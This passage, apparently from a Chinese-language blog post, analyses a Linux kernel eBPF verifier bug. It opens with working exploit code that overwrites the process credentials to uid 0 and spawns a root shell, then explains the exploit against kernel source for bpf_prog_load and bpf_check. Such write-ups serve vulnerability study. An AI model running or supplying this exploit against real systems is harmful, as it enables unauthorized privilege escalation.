class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)&amp;key,</span><br><span class="line">        .value = (__u64)&amp;value,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)key,</span><br><span class="line">        .value = (__u64)value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">    bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">    bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">    bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">    writemsg();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">    __update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">    __update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line">    __update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">    fp = __get_fp();</span><br><span class="line">    <span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    sp = get_sp(fp);</span><br><span class="line">    <span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">    credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line">    <span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">    __write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    prep();</span><br><span class="line">    pwn();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h1><p>首先我们看一下<code>prep</code>函数，首先此函数调用了<code>bpf_create_map</code>函数创建了一个大小为3的map结构，并返回map的fd赋值给了<code>mapfd</code>参数(测试后fd值为3)</p><p>之后，调用<code>bpf_prog_load</code>函数申请加载一个自定义的bpf指令集，类型为<code>BPF_PROG_TYPE_SOCKET_FILTER</code>，需要注意的是，在<code>linux 4.4</code>之前，bpf这个系统调用是需要<code>CAP_SYS_ADMIN</code>权限的，但是在<code>linux 4.4</code>之后，非特权用户可以使用<code>BPF_PROG_TYPE_SOCKET_FILTER</code>类型和相应的map创建受限的程序，所以这里我们作为非特权用户也只能创建这样的类型</p><p>在加载指令集的过程中，实际上就已经将我们的exp虚拟执行验证后加载了，上面一篇blog讲了exp的前四句，也即触发漏洞的部分，接着我们来讲讲exp的剩余指令，也即利用部分</p><p>在利用部分的一开头是如下两行指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br></pre></td></tr></table></figure><p>我们来看一下这两句指令在加载的过程中做了些什么</p><p>首先，来看看对应的系统调用处理函数的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* last field in &#x27;union bpf_attr&#x27; used by this command */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    BPF_PROG_LOAD_LAST_FIELD kern_version</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">    <span class="comment">// 要看看如何访问用户空间</span></span><br><span class="line">    <span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">                  <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;  <span class="comment">//拷贝完用户证书后末尾补上结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">    is_gpl = license_is_gpl_compatible(license); <span class="comment">//校验证书类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">        attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN)) <span class="comment">// 非特权用户只允许调用BPF_PROG_TYPE_SOCKET_FILTER</span></span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">    prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">    <span class="keyword">if</span> (!prog)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    err = bpf_prog_charge_memlock(prog);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">    prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">    err = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns), <span class="comment">// 将指令拷贝到prog结构体</span></span><br><span class="line">               prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">    prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">    prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">    prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">    err = find_prog_type(type, prog);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* run eBPF verifier */</span></span><br><span class="line">    err = bpf_check(&amp;prog, attr); <span class="comment">// 调用bpf_check</span></span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">    fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">    err = bpf_prog_select_runtime(prog);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">    err = bpf_prog_new_fd(prog);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* failed to allocate fd */</span></span><br><span class="line">        <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_used_maps:</span><br><span class="line">    free_used_maps(prog-&gt;aux);</span><br><span class="line">free_prog:</span><br><span class="line">    bpf_prog_uncharge_memlock(prog);</span><br><span class="line">free_prog_nouncharge:</span><br><span class="line">    bpf_prog_free(prog);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到实际上我们的指令在虚拟加载时，并不是像前文一样直接到了<code>do_check</code>函数，而是先到了<code>bpf_check</code>函数(前文为了直接讨论核心部分，省略了此部分)</p><p>那么来看看<code>bpf_check</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">        <span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span></span><br><span class="line"><span class="comment">     * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!env)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">    mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">        <span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment">         * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        log_level = attr-&gt;log_level;</span><br><span class="line">        log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">        log_size = attr-&gt;log_size;</span><br><span class="line">        log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ret = -EINVAL;</span><br><span class="line">        <span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">        <span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">            log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">        ret = -ENOMEM;</span><br><span class="line">        log_buf = vmalloc(log_size);</span><br><span class="line">        <span class="keyword">if</span> (!log_buf)</span><br><span class="line">            <span class="keyword">goto</span> free_env;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        log_level = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = replace_map_fd_with_map_ptr(env);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">    env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">                       <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">                       GFP_USER);</span><br><span class="line">    ret = -ENOMEM;</span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">        <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">    ret = check_cfg(env);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">    env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">    ret = do_check(env);</span><br><span class="line"></span><br><span class="line">skip_full_check:</span><br><span class="line">    <span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">    free_states(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">        ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">        BUG_ON(log_len &gt;= log_size);</span><br><span class="line">        <span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">        ret = -ENOSPC;</span><br><span class="line">        <span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">    <span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">        <span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">        env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">                              <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">                              GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">            ret = -ENOMEM;</span><br><span class="line">            <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">               <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">        env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment">         * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        convert_pseudo_ld_imm64(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">free_log_buf:</span><br><span class="line">    <span class="keyword">if</span> (log_level)</span><br><span class="line">        vfree(log_buf);</span><br><span class="line">free_env:</span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">        <span class="comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment">         * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        release_maps(env);</span><br><span class="line">    *prog = env-&gt;prog;</span><br><span class="line">    kfree(env);</span><br><span class="line">    mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要关注<code>replace_map_fd_with_map_ptr</code>函数，这个函数主要是将我们之前得到的mapfd转化为map的指针，以保证我们申请的map可以和我们申请的bpf指令联系起来</p><p>来看看这个函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 